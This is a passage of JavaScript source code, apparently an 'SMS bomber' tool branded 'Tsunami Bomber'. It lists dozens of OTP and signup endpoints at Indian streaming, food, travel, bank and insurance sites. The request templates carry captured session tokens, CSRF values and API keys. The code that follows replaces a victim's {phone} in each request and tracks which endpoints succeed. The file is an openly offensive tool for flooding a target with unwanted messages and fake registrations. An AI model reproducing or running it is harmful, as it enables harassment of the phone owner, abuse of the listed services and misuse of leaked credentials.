    { name: "Zee5", method: "GET", url: "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}", headers: { "accept": "*/*", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "Origin": "https://www.zee5.com", "Referer": "https://www.zee5.com/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" } },
    { name: "AltBalaji_2", method: "POST", url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", headers: { "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU", "Content-Type": "application/json", "Origin": "https://www.altbalaji.com", "Referer": "https://www.altbalaji.com/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phone_number": "{phone}", "country_code": "91", "platform": "web", "exp": 1603915826710 } },
    { name: "Hotstar_2", method: "PUT", url: "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", headers: { "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ0MzQ5NDUsImlhdCI6MTYwMzgzMDE0NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiNDcuOS4xMjIuNDVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiZmFhODhmMDUtNzQzMi00MTAzLTk4ODYtN2JkOTM0ZjVjM2ExXCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwMzgzMDE0NTg4NH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ATU4GrG4KucvkynhrFdg28qJ9LRwsN5MoWHlirRQsqo", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "x-hs-platform": "PCTV", "x-country-code": "IN", "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "hotstarauth": "st=1603830144~exp=1603836144~acl=/um/v3/*~hmac=cc2a715c0f26045e44e271d198ae382468d8a7dcb08825623016d6dcea06072d", "x-hs-appversion": "6.93.0", "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "accept": "*/*", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phone_number": "{phone}", "country_prefix": "91" } },
    { name: "Dream11_2", method: "POST", url: "https://www.dream11.com/graphql/mutation/pwa/register", headers: { "accept": "*/*", "device": "pwa", "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://www.dream11.com", "referer": "https://www.dream11.com/register?testcode=affpwa2&utm_source=VcomIndWeb&utm_medium=cpr&utm_campaign=98885&utm_content=20200919", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": { "email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia" } } },
    { name: "Quikr_V2", method: "POST", url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "accept": "*/*", "origin": "https://www.quikr.com", "referer": "https://www.quikr.com/SignIn?redirect=https%3A%2F%2Fwww.quikr.com%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "user={phone}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IY0gDg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true" } },
    { name: "Kotak_1", method: "POST", url: "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc", headers: { "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.kotak.com", "Referer": "https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/vkyc-home.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile={phone}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes" } },
    { name: "Cuemath_2", method: "POST", url: "https://www.cuemath.com/api/v4/parents/", headers: { "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/JSON", "accept": "*/*", "origin": "https://www.cuemath.com", "referer": "https://www.cuemath.com/parent/signup/?", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "intl_mobile": { "phone": "{phone}" }, "notify": ["notify_on_whatsapp"], "phone": "{phone}", "email": "tsunami@gmail.com", "full_name": "Tsunami Bomber", "timezone": "Asia/Calcutta", "notify_through": "notify_on_whatsapp", "form_fields": "full_name,email,intl_mobile" } },
    { name: "RedBus_2", method: "GET", url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined", headers: { "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "referer": "https://m.redbus.in/preregister", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" } },
    { name: "HappyEasyGo", method: "GET", url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}&verifycode=FDCA", headers: { "accept": "application/json, text/plain, */*", "x-device": "mobile", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "referer": "https://m.happyeasygo.com/register", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" } },
    { name: "MakeMyTrip", method: "POST", url: "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr", headers: { "deviceid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "currency": "inr", "language": "eng", "authorization": "h4nhc9jcgpAGIjp", "visitor-id": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "region": "in", "accept": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"a3d2f892-af4d-40d1-808a-db6286b8fe1f\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"value\":null}", "vid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "tid": "a3d2f892-af4d-40d1-808a-db6286b8fe1f", "origin": "https://www.makemytrip.com", "referer": "https://www.makemytrip.com/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "loginId": "{phone}", "type": "MOBILE", "version": 2, "countryCode": "91" } },
    { name: "EasyMyTrip", method: "POST", url: "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/", headers: { "accept": "text/plain, */*; q=0.01", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json; charset=UTF-8", "origin": "https://mybookings.easemytrip.com", "referer": "https://mybookings.easemytrip.com/MyBooking/Profile", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "emailph": "{phone}" } },
    { name: "BookMyShow_2", method: "POST", url: "https://in.bookmyshow.com/pwa/api/uapi/otp/send", headers: { "accept": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://in.bookmyshow.com", "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={phone}&email=&source=web", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "channel": "phone", "subChannel": "sms", "details": { "phone": "{phone}", "origin": "https://in.bookmyshow.com" } } },
    { name: "Zomato_2", method: "POST", url: "https://www.zomato.com/webroutes/auth/login", headers: { "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.zomato.com", "referer": "https://www.zomato.com/kanpur", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone" } },
    { name: "Dominos", method: "POST", url: "https://api.dominos.co.in/loginhandler/forgotpassword", headers: { "strict-transport-security": "max-age=1636116872593", "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS", "x-content-type-options": "nosniff", "api_key": "d2aeb489bb8df385", "ga_client_id": "559252815.1604559839", "status": "SUCCESS", "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp", "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72", "x-forwarded-for-requestid": "1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72", "cartid": "1823648622264698", "source": "PWA18#upsellC", "isloggedin": "false", "client_type": "web app-chrome", "accesskeyid": "ASIAWMIT2NXASDYLBK5W1604559840", "x-frame-options": "mitigate", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "credentials": "[object Object]", "deliverytype": "D", "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840", "access-control-allow-origin": "", "accept": "application/json, text/plain, */", "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8", "content-type": "application/json", "access-control-allow-headers": "*", "storeid": "6585R", "ab_test_variant": "New Flow", "origin": "https://m.dominos.co.in", "referer": "https://m.dominos.co.in/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "lastName": "", "mobile": "{phone}", "firstName": "" } },
    { name: "PizzaHut", method: "POST", url: "https://api.pizzahut.io/v1/otp/generate", headers: { "x-trace-id": "f222f460-946d-4c59-bb9e-e87db924399c", "x-environment-flag": "production", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "recaptcha-token": "03AGdBq25_PaOvx0wAkF3F42ZlMFOK_MV_jF_Q02EKNfJN8lM1f5HSf9d4yxlWDX0Le16IU8rhHV_IUx_CkclsYMviCYTWbvdiiiaUjzTCt52xgED29gx9PW5i0enDH01ne5h3-7hE5d1XFUDaNz33HvJHsupCC1fkOXCHRmkVDOIrKrP-ucgZk8QOOtAgIfe8PJ5JkPH1eLdKVyJb5Sd3lYd8zPZUim1pt59CqOeuK_YD4PQVMt1vBoazROTGEFBfqapC40sBHBK-EbG3CjOCc3y9f7jVinXG8MZ8nhEbfUwqE4b5bGVaV3UAe3isB441XwKqYxVibHbPQwY90oq5O5o1aGB2i6aN7AUo2o5zUYA1uRIVdFZuKlZ7G2k4QusN9seS6HqHv3xESCH-C8Zk3L9QOYiO6pczr9YnkKPX8jl1lt2z4YiTRuyz1oVCFFD8qd8YFj2LMPKqgLNr8DGBPpbLtQhwArKtzQ", "content-type": "application/json; charset=utf-8", "accept": "/", "origin": "https://www.pizzahut.co.in", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phone": "+91{phone}" } },
    { name: "KFC", method: "POST", url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228", headers: { "accept": "application/json, text/plain, /", "__requestverificationtoken": "x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "origin": "https://online.kfc.co.in", "referer": "https://online.kfc.co.in/login", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phoneNumber": "{phone}", "AuthorizedFor": "3", "Resend": "false" } },
    { name: "BurgerKing", method: "POST", url: "https://consumer-apis.burgerking.in/api/v1/user/signUp", headers: { "appversion": "1.6", "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70", "content-type": "application/json", "access-control-allow-origin": "", "accept": "application/json, text/plain, */", "timestamp": "1604561218463", "userid": "TEMP6922285271604561176", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "platform": "web", "type": "dinein", "encryptionkey": "39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38", "origin": "https://www.burgerking.in", "referer": "https://www.burgerking.in/", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "phone_no": "{phone}" } },
    { name: "Dineout", method: "POST", url: "https://www.dineout.co.in/xhrajaxrequest/user_signup", headers: { "accept": "application/json, text/javascript, /; q=0.01", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.dineout.co.in", "referer": "https://www.dineout.co.in/non-veg-special-restaurants-near-me", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={phone}" } },
    { name: "Purplle", method: "GET", url: "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register", headers: { "device_id": "TEC3cjyVJhEFPGsSHw", "tracestate": "2174843@nr=0-1-2174843-954632846-ab28153acde8ef8e----1604563013484", "traceparent": "00-9c150aeaf03c0d35987fe67bd2403510-ab28153acde8ef8e-01", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIxNzQ4NDMiLCJhcCI6Ijk1NDYzMjg0NiIsImlkIjoiYWIyODE1M2FjZGU4ZWY4ZSIsInRyIjoiOWMxNTBhZWFmMDNjMGQzNTk4N2ZlNjdiZDI0MDM1MTAiLCJ0aSI6MTYwNDU2MzAxMzQ4NH19", "content-type": "application/x-www-form-urlencoded", "accept": "application/json, text/plain, /", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs", "referer": "https://www.purplle.com/login", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" } },
    { name: "AngelBroking", method: "POST", url: "https://www.angelbroking.com/form-gateways/oda-form.php", headers: { "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "origin": "https://www.angelbroking.com", "content-type": "application/x-www-form-urlencoded", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "referer": "https://www.angelbroking.com/open-demat-account", "accept-encoding": "gzip, deflate, br", "accept-language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "name=Tsunami+Bomber&mobile={phone}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752" } },
    { name: "ASVM_Faizabad", method: "POST", url: "http://asvmfaizabad.org/register.php", headers: { "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "Origin": "http://asvmfaizabad.org", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://asvmfaizabad.org/register.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8" }, data: { "_raw": "id=6778500660&name=TsunamiBomber&mobile={phone}&email=hacker%40gmail.com&address=faizabad&pin=224001&submit=Register" } },

    // ============================================================
    // 🏦 BANK APIS
    // ============================================================
    { name: "Kotak Bank SMS", url: "https://www.kotak.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone: p }) },
    { name: "Axis Bank SMS", url: "https://www.axisbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "ICICI Bank SMS", url: "https://www.icicibank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "HDFC Bank SMS", url: "https://www.hdfcbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "SBI SMS", url: "https://www.sbi.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Yes Bank SMS", url: "https://www.yesbank.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "IndusInd SMS", url: "https://www.indusind.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "IDFC First SMS", url: "https://www.idfcfirstbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "AU Bank SMS", url: "https://www.aubank.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "RBL Bank SMS", url: "https://www.rblbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Bandhan Bank SMS", url: "https://www.bandhanbank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Federal Bank SMS", url: "https://www.federalbank.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Canara Bank SMS", url: "https://www.canarabank.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Bank of Baroda SMS", url: "https://www.bankofbaroda.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Indian Bank SMS", url: "https://www.indianbank.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Central Bank SMS", url: "https://www.centralbankofindia.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Bank of India SMS", url: "https://www.bankofindia.co.in/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "PSB Bank SMS", url: "https://www.psbindia.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },

    // ============================================================
    // 🛡️ INSURANCE APIS
    // ============================================================
    { name: "Acko SMS", url: "https://www.acko.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Bajaj Allianz SMS", url: "https://www.bajajallianz.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Max Bupa SMS", url: "https://www.maxbupa.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
    { name: "Kotak Life SMS", url: "https://www.kotaklife.com/api/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },

    // ============================================================
    // 📱 TELECOM APIS
    // ============================================================
    { name: "MyVi SMS", url: "https://www.myvi.in/otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p }) },
];

// ============================================================
// ===== DEDUPLICATE APIS =====
// ============================================================

const seenUrls = new Set();
const seenNames = new Set();
const uniqueApis = [];

for (const api of APIS) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name}` : api.url;
    const nameKey = api.name;
    if (!seenUrls.has(urlKey) && !seenNames.has(nameKey)) {
        seenUrls.add(urlKey);
        seenNames.add(nameKey);
        uniqueApis.push(api);
    }
}

// ============================================================
// ===== SPLIT APIS =====
// ============================================================

const NORMAL_APIS = uniqueApis.filter(api => !api.rateLimit);
const RATE_LIMIT_APIS = uniqueApis.filter(api => api.rateLimit);

console.log(`✅ Loaded ${uniqueApis.length} total unique APIs`);
console.log(`   🟢 Normal: ${NORMAL_APIS.length} | ⚠️ RL: ${RATE_LIMIT_APIS.length}`);

// ============================================================
// ===== STATS & LOGGING =====
// ============================================================

const stats = {};
const recentLogs = [];
const MAX_LOGS = 500;

uniqueApis.forEach(api => {
    stats[api.name] = {
        name: api.name,
        total: 0,
        working_2xx: 0,
        rate_limited_429: 0,
        rejected_4xx: 0,
        failed_5xx: 0,
        network_error: 0,
        lastStatus: null,
        lastStatusCode: null,
        lastTime: null,
        lastError: null,
        avgResponseTime: 0,
        isRateLimited: api.rateLimit || false
    };
});

function logEvent(msg, type = 'info') {
    const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️', rl: '🚫' }[type] || 'ℹ️';
    console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
    recentLogs.push({ time: new Date().toISOString(), type, msg });
    if (recentLogs.length > MAX_LOGS) recentLogs.shift();
}

function recordResult(apiName, category, statusCode, responseTime, error = null) {
    const s = stats[apiName];
    if (!s) return;
    s.total++;
    if (category === 'success') { s.working_2xx++; s.lastStatus = 'WORKING'; }
    else if (category === 'ratelimit') { s.rate_limited_429++; s.lastStatus = 'RATE_LIMITED'; }
    else if (category === 'rejected') { s.rejected_4xx++; s.lastStatus = 'REJECTED'; }
    else if (category === 'fail5xx') { s.failed_5xx++; s.lastStatus = 'FAILED_5XX'; }
    else { s.network_error++; s.lastStatus = 'NETWORK_ERROR'; }
    s.lastStatusCode = statusCode;
    s.lastTime = new Date().toISOString();
    s.lastError = error;
    s.avgResponseTime = s.avgResponseTime === 0 ? responseTime : Math.round((s.avgResponseTime * (s.total - 1) + responseTime) / s.total);
}

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) return JSON.stringify({ mobile: phone });
    if (lower.includes('whatsapp')) return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') data = api.data(phone);
            else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
